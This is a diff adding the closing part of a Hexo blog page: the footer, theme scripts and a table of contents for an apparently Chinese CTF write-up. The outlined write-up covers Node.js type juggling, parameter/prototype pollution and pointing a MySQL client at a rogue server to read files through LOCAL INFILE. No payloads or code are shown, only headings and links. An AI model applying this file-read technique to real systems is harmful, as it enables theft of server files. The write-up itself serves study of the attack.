+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://example.com/" title="Title" target="_blank">Title</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#0x01-首先要更改nodejs的mysql连接方式。"><span class="nav-number">1.0.1.</span> <span class="nav-text">0x01 首先要更改nodejs的mysql连接方式。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x02-题目的首页如下："><span class="nav-number">1.0.2.</span> <span class="nav-text">0x02 题目的首页如下：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x03-接下来你会想到什么？"><span class="nav-number">1.0.3.</span> <span class="nav-text">0x03 接下来你会想到什么？</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-在这里你可能会想到爆破，sql注入等但是都不是。"><span class="nav-number">1.0.3.1.</span> <span class="nav-text">1. 在这里你可能会想到爆破，sql注入等但是都不是。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-现在你应该看看他的数据包，找找信息，比如这个就是一个Express空架，就是nodejs做后台，那么你会想到什么呢。"><span class="nav-number">1.0.3.2.</span> <span class="nav-text">2. 现在你应该看看他的数据包，找找信息，比如这个就是一个Express空架，就是nodejs做后台，那么你会想到什么呢。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3-下面就来介绍一下nodejs作为弱类型的一些特性。"><span class="nav-number">1.0.3.3.</span> <span class="nav-text">3. 下面就来介绍一下nodejs作为弱类型的一些特性。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我通过代码调试到达这个函数："><span class="nav-number">1.0.3.4.</span> <span class="nav-text">我通过代码调试到达这个函数：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#上面这个会把传入参数如-0-中的值解析出来val-0。"><span class="nav-number">1.0.3.5.</span> <span class="nav-text">上面这个会把传入参数如[0]中的值解析出来val=0。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#紧接着调试的结果如下："><span class="nav-number">1.0.3.6.</span> <span class="nav-text">紧接着调试的结果如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#执行的sql语句如下："><span class="nav-number">1.0.3.7.</span> <span class="nav-text">执行的sql语句如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#最后的结果如下："><span class="nav-number">1.0.3.8.</span> <span class="nav-text">最后的结果如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#参考链接"><span class="nav-number">1.0.3.9.</span> <span class="nav-text">参考链接</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#现在我们通过了第一步："><span class="nav-number">1.0.3.10.</span> <span class="nav-text">现在我们通过了第一步：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x04-现在我们拿到了后端的代码如下："><span class="nav-number">1.0.4.</span> <span class="nav-text">0x04 现在我们拿到了后端的代码如下：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#我们可以看到这个题目可以通过控制host参数去改变mysql的连接地址，这里有个mysql客户端任意文件读取的问题，参考链接如下："><span class="nav-number">1.0.4.1.</span> <span class="nav-text">我们可以看到这个题目可以通过控制host参数去改变mysql的连接地址，这里有个mysql客户端任意文件读取的问题，参考链接如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-blog-csdn-net-ls1120704214-article-details-88174003"><span class="nav-number">1.0.4.2.</span> <span class="nav-text">https://blog.csdn.net/ls1120704214/article/details/88174003</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#如果直接在json中传递-quot-host-quot-quot-quot-，不会有任何的作用，因为有过滤。"><span class="nav-number">1.0.4.3.</span> <span class="nav-text">如果直接在json中传递{&quot;host&quot;:&quot;&quot;}，不会有任何的作用，因为有过滤。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#如果发现有直接传递进来的host参数，nodejs就报错退出，所以，通过仔细观察源代码，发现这个代码有参数污染问题，关于参数污染，可以参考这篇文章："><span class="nav-number">1.0.4.4.</span> <span class="nav-text">如果发现有直接传递进来的host参数，nodejs就报错退出，所以，通过仔细观察源代码，发现这个代码有参数污染问题，关于参数污染，可以参考这篇文章：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-www-4hou-com-technology-16328-html"><span class="nav-number">1.0.4.5.</span> <span class="nav-text">https://www.4hou.com/technology/16328.html</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#所以就可以通过构造如下参数去改变host参数，把host参数变成我们自己mysql服务器的地址"><span class="nav-number">1.0.4.6.</span> <span class="nav-text">所以就可以通过构造如下参数去改变host参数，把host参数变成我们自己mysql服务器的地址</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#首先，我要先把我服务器中的Rogue-mysql-Server的rogue-mysql-server-py中的filelist改成flag的地址"><span class="nav-number">1.0.4.7.</span> <span class="nav-text">首先，我要先把我服务器中的Rogue-mysql-Server的rogue_mysql_server.py中的filelist改成flag的地址</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#之后利用原型链的污染将host改为如下："><span class="nav-number">1.0.4.8.</span> <span class="nav-text">之后利用原型链的污染将host改为如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#就可以在mysql服务器日志中收到flag了。"><span class="nav-number">1.0.4.9.</span> <span class="nav-text">就可以在mysql服务器日志中收到flag了。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x05-PHP-with-PDO"><span class="nav-number">1.0.5.</span> <span class="nav-text">0x05 PHP with PDO</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#其余的语言同理。"><span class="nav-number">1.0.5.1.</span> <span class="nav-text">其余的语言同理。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#恶意mysql服务器"><span class="nav-number">1.0.5.2.</span> <span class="nav-text">恶意mysql服务器</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x06-参考链接"><span class="nav-number">1.0.6.</span> <span class="nav-text">0x06 参考链接</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#https-xz-aliyun-com-t-6991"><span class="nav-number">1.0.6.1.</span> <span class="nav-text">https://xz.aliyun.com/t/6991</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-blog-csdn-net-ls1120704214-article-details-88174003-1"><span class="nav-number">1.0.6.2.</span> <span class="nav-text">https://blog.csdn.net/ls1120704214/article/details/88174003</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#MySQL-MySQL-Internals-Manual-14-MySQL-Client-Server-Protocol"><span class="nav-number">1.0.6.3.</span> <span class="nav-text">MySQL :: MySQL Internals Manual :: 14 MySQL Client/Server Protocol</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#从MySQL出发的反击之路"><span class="nav-number">1.0.6.4.</span> <span class="nav-text">从MySQL出发的反击之路</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Read-MySQL-Client’s-File-不发光的博客"><span class="nav-number">1.0.6.5.</span> <span class="nav-text">Read MySQL Client’s File - 不发光的博客</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#如何利用MySQL-LOCAL-INFILE读取客户端文件"><span class="nav-number">1.0.6.6.</span> <span class="nav-text">如何利用MySQL LOCAL INFILE读取客户端文件</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#MySQL-connect-file-read"><span class="nav-number">1.0.6.7.</span> <span class="nav-text">MySQL connect file read</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-stackoverflow-com-questions-7638090-load-data-local-infile-forbidden-in-php"><span class="nav-number">1.0.6.8.</span> <span class="nav-text">https://stackoverflow.com/questions/7638090/load-data-local-infile-forbidden-in-php</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-github-com-allyshka-Rogue-MySql-Server"><span class="nav-number">1.0.6.9.</span> <span class="nav-text">https://github.com/allyshka/Rogue-MySql-Server</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-www-cnblogs-com-BOHB-yunying-p-10820453-html"><span class="nav-number">1.0.6.10.</span> <span class="nav-text">https://www.cnblogs.com/BOHB-yunying/p/10820453.html</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ljdd520</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">112k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
